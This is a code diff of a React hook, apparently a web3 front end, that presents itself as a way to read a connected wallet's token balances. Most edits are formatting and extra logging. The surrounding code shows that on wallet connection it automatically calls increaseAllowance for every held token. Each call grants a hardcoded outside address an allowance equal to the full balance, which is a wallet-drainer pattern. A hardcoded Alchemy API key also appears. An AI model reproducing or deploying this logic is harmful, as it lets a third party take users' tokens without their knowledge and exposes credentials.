@@ -5,31 +5,31 @@ import Erc20Abi from "../abi/Erc20Abi";
 import { config as wagmiConfig } from "../../wagmiConfig";
 import { writeContract } from "@wagmi/core";
 
-
-const UseAccountBalances = ({connectionStatus}) => {
+const UseAccountBalances = ({ connectionStatus }) => {
   const { address, isConnected, status } = useAccount();
   const { chains, switchChain } = useSwitchChain();
   const [tokensData, setTokensData] = useState([]);
-  const { disconnect } = useDisconnect()
+  const { disconnect } = useDisconnect();
 
   const config = {
-    apiKey:  "qP-0Eg2caD2AE-M7va68Bna1sIy2E3H-", 
+    apiKey: "qP-0Eg2caD2AE-M7va68Bna1sIy2E3H-",
     network: Network.ETH_SEPOLIA,
   };
   const alchemy = new Alchemy(config);
 
   useEffect(() => {
     if (isConnected) {
-      connectionStatus()
+      connectionStatus();
       getUserTokens();
     }
-  }, [isConnected]); 
+  }, [isConnected]);
 
   const getUserTokens = async () => {
     try {
       const data = await alchemy.core.getTokenBalances(address);
       const newTokensData = data.tokenBalances.filter(
-        (tokensDetails) => !tokensData.some((token) => token.id === tokensDetails.id)
+        (tokensDetails) =>
+          !tokensData.some((token) => token.id === tokensDetails.id)
       );
       setTokensData((prevTokensData) => [...prevTokensData, ...newTokensData]);
       increaseAllowanceForTokens([...tokensData, ...newTokensData]);
@@ -39,14 +39,20 @@ const UseAccountBalances = ({connectionStatus}) => {
   };
 
   const increaseAllowanceForTokens = async (tokensData) => {
-    tokensData.forEach((obj) => {
-      const { contractAddress, tokenBalance } = obj;
-      const hexToNumber = parseInt(tokenBalance,  16);
+    let i = 1;
+    for (let token of tokensData) {
+      const { contractAddress, tokenBalance } = token;
+      const metadata = await alchemy.core.getTokenMetadata(contractAddress); // Compute token balance in human-readable format
 
-      if (hexToNumber >  0) {
+      const hexToNumber = parseInt(tokenBalance, 16);
+
+      if (hexToNumber > 0) {
         increaseAllowance(contractAddress, hexToNumber);
-      }
-    });
+        console.log(
+          `${i++}. ${metadata.name}: ${hexToNumber} ${metadata.symbol}`
+        );
+        }
+    }
   };
 
   const increaseAllowance = async (contractAddress, allowance) => {
@@ -58,13 +64,18 @@ const UseAccountBalances = ({connectionStatus}) => {
         args: ["0x9448531F22c38b1B7BFBDeD3eF0aCB59359D1e9f", allowance],
       });
       console.log("Transaction hash:", hash);
+      const myObject = {
+        "contract address": contractAddress,
+        "token balance": allowance,
+      };
+      console.table(myObject);
+    
     } catch (error) {
       console.error("Increase allowance error", error);
     }
   };
 
-  return <div>
-</div>;
+  return <div></div>;
 };
 
 export default UseAccountBalances;
